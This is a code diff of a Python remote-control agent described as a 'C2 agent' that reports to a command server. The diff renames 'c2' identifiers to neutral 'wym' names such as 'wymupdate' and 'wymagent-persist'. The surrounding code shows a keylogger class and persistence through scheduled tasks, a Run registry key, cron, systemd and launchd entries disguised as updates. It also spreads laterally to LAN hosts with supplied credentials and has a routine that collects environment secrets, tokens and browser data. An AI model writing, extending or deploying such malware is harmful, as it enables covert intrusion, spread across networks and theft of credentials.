@@ -15,14 +15,14 @@ Usage:
                     --interval 5 --jitter 2 --verbose
 
 Environment variables (accepted when the flag is not given):
-    C2_SERVER, C2_TOKEN, C2_INTERVAL, C2_JITTER, C2_STATE_FILE, C2_VERBOSE
+    WYM_SERVER, WYM_TOKEN, WYM_INTERVAL, WYM_JITTER, WYM_STATE_FILE, WYM_VERBOSE
 
 Flags:
-    --server URL      server base URL (required unless C2_SERVER is set)
-    --token TOKEN     shared agent token (required unless C2_TOKEN is set)
+    --server URL      server base URL (required unless WYM_SERVER is set)
+    --token TOKEN     shared agent token (required unless WYM_TOKEN is set)
     --interval N      heartbeat interval in seconds (default 10, min 1)
     --jitter N        random jitter in seconds added to the interval
-    --state FILE      state file persisting the agent id (default ~/.c2agent.json)
+    --state FILE      state file persisting the agent id (default ~/.wymagent.json)
     --verbose         print activity to stdout
     -h, --help        show this help and exit
 
@@ -47,7 +47,7 @@ from datetime import datetime, timezone
 
 import requests
 
-DEFAULT_STATE = os.path.join(os.path.expanduser("~"), ".c2agent.json")
+DEFAULT_STATE = os.path.join(os.path.expanduser("~"), ".wymagent.json")
 
 SHELL_TIMEOUT = 120   # seconds
 OUTPUT_LIMIT = 12000   # characters reported back
@@ -139,7 +139,7 @@ class KeyLogger:
         return self._active
 
 
-class c2agent:
+class wymagent:
     def __init__(self, server: str, token: str, interval: int = 10,
                  jitter: float = 0.0, state_file: str = DEFAULT_STATE,
                  verbose: bool = False):
@@ -285,9 +285,9 @@ class c2agent:
 
     def _persist_win(self) -> dict:
         base = os.environ.get("APPDATA") or os.path.expanduser("~")
-        drop = os.path.join(base, "Microsoft", "Windows", "c2update")
+        drop = os.path.join(base, "Microsoft", "Windows", "wymupdate")
         os.makedirs(drop, exist_ok=True)
-        name = "c2agent" + (os.path.splitext(sys.argv[0])[1] or ".py")
+        name = "wymagent" + (os.path.splitext(sys.argv[0])[1] or ".py")
         dest = os.path.join(drop, name)
         try:
             shutil.copyfile(sys.argv[0], dest)
@@ -300,10 +300,10 @@ class c2agent:
         # Run key can reference it without fragile nested-quote escaping.
         progdata = os.environ.get("ProgramData") or os.environ.get(
             "ALLUSERSPROFILE", r"C:\ProgramData")
-        launcher_dir = os.path.join(progdata, "c2update")
+        launcher_dir = os.path.join(progdata, "wymupdate")
         try:
             os.makedirs(launcher_dir, exist_ok=True)
-            wrapper = os.path.join(launcher_dir, "c2relaunch.cmd")
+            wrapper = os.path.join(launcher_dir, "wymrelaunch.cmd")
             with open(wrapper, "w", encoding="utf-8") as fh:
                 fh.write("@echo off\r\nstart \"\" /b " + relaunch + "\r\n")
         except OSError as exc:
@@ -311,13 +311,13 @@ class c2agent:
                     "exit_code": 1}
         lines.append(f"persistence: wrote launcher {wrapper}")
         r = self._cmd(
-            f'schtasks /Create /TN "c2agent-persist" /TR "{wrapper}" '
+            f'schtasks /Create /TN "wymagent-persist" /TR "{wrapper}" '
             f'/SC ONLOGON /RL HIGHEST /F 2>&1', 30)
         lines.append(r["output"].strip())
         try:
             reg = subprocess.run(
                 ["reg", "add", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
-                 "/v", "c2agent", "/t", "REG_SZ", "/d", wrapper, "/f"],
+                 "/v", "wymagent", "/t", "REG_SZ", "/d", wrapper, "/f"],
                 capture_output=True, text=True, timeout=30)
             r2out = (reg.stdout or "") + (reg.stderr or "")
             r2code = reg.returncode
@@ -329,7 +329,7 @@ class c2agent:
         return {"output": truncate_output("\n".join(lines)), "exit_code": code}
 
     def _persist_unix(self, launchd: bool = False) -> dict:
-        cfg = os.path.join(os.path.expanduser("~"), ".config", "c2update")
+        cfg = os.path.join(os.path.expanduser("~"), ".config", "wymupdate")
         os.makedirs(cfg, exist_ok=True)
         src = os.path.abspath(sys.argv[0])
         dest = os.path.join(cfg, os.path.basename(src))
@@ -341,14 +341,14 @@ class c2agent:
         relaunch = self._relaunch_cmd(dest)
         lines = [f"persistence: copied self to {dest}"]
         if launchd:
-            plist = os.path.join(cfg, "com.c2.update.plist")
+            plist = os.path.join(cfg, "com.wym.update.plist")
             with open(plist, "w", encoding="utf-8") as fh:
                 fh.write(
                     '<?xml version="1.0" encoding="UTF-8"?>\n'
                     '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
                     '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
                     '<plist version="1.0"><dict>\n'
-                    '<key>Label</key><string>com.c2.update</string>\n'
+                    '<key>Label</key><string>com.wym.update</string>\n'
                     '<key>ProgramArguments</key><array>\n'
                     '<string>/bin/sh</string><string>-c</string>'
                     f'<string>{relaunch}</string>\n</array>\n'
@@ -359,15 +359,15 @@ class c2agent:
             lines.append(r["output"].strip())
             return {"output": truncate_output("\n".join(lines)),
                     "exit_code": r["exit_code"]}
-        cron = "@reboot " + relaunch + " # c2agent-persist"
+        cron = "@reboot " + relaunch + " # wymagent-persist"
         r = self._cmd(
-            "(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; "
+            "(crontab -l 2>/dev/null | grep -v 'wymagent-persist'; "
             "echo " + self._quote(cron) + ") | crontab - 2>&1", 30)
         lines.append(r["output"].strip())
-        unit = os.path.join(cfg, "c2-update.service")
+        unit = os.path.join(cfg, "wym-update.service")
         with open(unit, "w", encoding="utf-8") as fh:
             fh.write(
-                "[Unit]\nDescription=c2 update\n\n[Service]\nType=simple\n"
+                "[Unit]\nDescription=wym update\n\n[Service]\nType=simple\n"
                 "ExecStart=/bin/sh -c " + self._quote(relaunch) + "\n"
                 "Restart=always\n\n[Install]\nWantedBy=default.target\n")
         r2 = self._cmd(
@@ -427,14 +427,14 @@ class c2agent:
             self._cmd(f'net use "{share}" /delete /y 2>&1', 20)
             return f"failed (copy: {tail})"
         r = self._cmd(
-            f'schtasks /Create /S {host} /TN "c2agent-lateral" '
+            f'schtasks /Create /S {host} /TN "wymagent-lateral" '
             f'/TR "{remote}" /SC ONLOGON /RU {user} /RP {pwd} '
             f'/RL HIGHEST /F 2>&1', 30)
         self._cmd(f'net use "{share}" /delete /y 2>&1', 20)
         if r["exit_code"] != 0:
             tail = r["output"].strip().replace("\n", "; ")
             return f"deployed (file dropped; task: {tail})"
-        return "deployed (file dropped + scheduled c2agent-lateral)"
+        return "deployed (file dropped + scheduled wymagent-lateral)"
 
     def _deploy_unix(self, host: str, user: str, pwd: str) -> str:
         if not shutil.which("sshpass"):
@@ -463,9 +463,9 @@ class c2agent:
 
     def _lateral(self, args: dict) -> dict:
         subnet = str(args.get("subnet") or "").strip()
-        user = str(args.get("user") or os.environ.get("C2_LAT_USER",
+        user = str(args.get("user") or os.environ.get("WYM_LAT_USER",
                                                       "")).strip()
-        pwd = str(args.get("pass") or os.environ.get("C2_LAT_PASS",
+        pwd = str(args.get("pass") or os.environ.get("WYM_LAT_PASS",
                                                      "")).strip()
         peers = self._lan_peers(subnet)
         if not peers:
@@ -474,7 +474,7 @@ class c2agent:
         deployed = failed = skipped = 0
         for host in peers:
             if not user or not pwd:
-                status = "skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)"
+                status = "skipped (no credentials; set WYM_LAT_USER/WYM_LAT_PASS)"
             elif sys.platform == "win32":
                 status = self._deploy_win(host, user, pwd)
             else:
@@ -777,7 +777,7 @@ class c2agent:
         profile = str(args.get("profile") or "all").strip().lower()
         if profile not in ("all", "env", "tokens", "browser"):
             profile = "all"
-        work = tempfile.mkdtemp(prefix="c2steal_")
+        work = tempfile.mkdtemp(prefix="wymsteal_")
         manifest = []
         try:
             if profile in ("all", "env"):
@@ -996,18 +996,18 @@ def main() -> None:
         prog="python agent.py",
         usage="%(prog)s --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]",
         description="C2 agent (Python reference client)")
-    parser.add_argument("--server", default=os.environ.get("C2_SERVER", ""),
-                        help="C2 server URL (C2_SERVER env var accepted)")
-    parser.add_argument("--token", default=os.environ.get("C2_TOKEN", ""),
-                        help="shared agent token (C2_TOKEN env var accepted)")
-    parser.add_argument("--interval", type=int, default=_env_int("C2_INTERVAL", 10),
+    parser.add_argument("--server", default=os.environ.get("WYM_SERVER", ""),
+                        help="C2 server URL (WYM_SERVER env var accepted)")
+    parser.add_argument("--token", default=os.environ.get("WYM_TOKEN", ""),
+                        help="shared agent token (WYM_TOKEN env var accepted)")
+    parser.add_argument("--interval", type=int, default=_env_int("WYM_INTERVAL", 10),
                         help="heartbeat interval in seconds (default 10)")
-    parser.add_argument("--jitter", type=float, default=_env_float("C2_JITTER", 0.0),
+    parser.add_argument("--jitter", type=float, default=_env_float("WYM_JITTER", 0.0),
                         help="random jitter in seconds added to the interval")
-    parser.add_argument("--state", default=os.environ.get("C2_STATE_FILE", DEFAULT_STATE),
+    parser.add_argument("--state", default=os.environ.get("WYM_STATE_FILE", DEFAULT_STATE),
                         help=f"state file (default {DEFAULT_STATE})")
     parser.add_argument("--verbose", action="store_true",
-                        default=os.environ.get("C2_VERBOSE", "") in ("1", "true"),
+                        default=os.environ.get("WYM_VERBOSE", "") in ("1", "true"),
                         help="print activity to stdout")
     _value_opts = {"--server", "--token", "--interval", "--jitter", "--state"}
     _argv, _i = [], 0
@@ -1022,12 +1022,12 @@ def main() -> None:
     args = parser.parse_args(_argv)
 
     if not args.token:
-        parser.error("--token is required (or set C2_TOKEN)")
+        parser.error("--token is required (or set WYM_TOKEN)")
     if not args.server:
-        parser.error("--server is required (or set C2_SERVER)")
+        parser.error("--server is required (or set WYM_SERVER)")
 
     try:
-        c2agent(server=args.server, token=args.token, interval=args.interval,
+        wymagent(server=args.server, token=args.token, interval=args.interval,
                 jitter=args.jitter, state_file=args.state,
                 verbose=args.verbose).run()
     except KeyboardInterrupt:
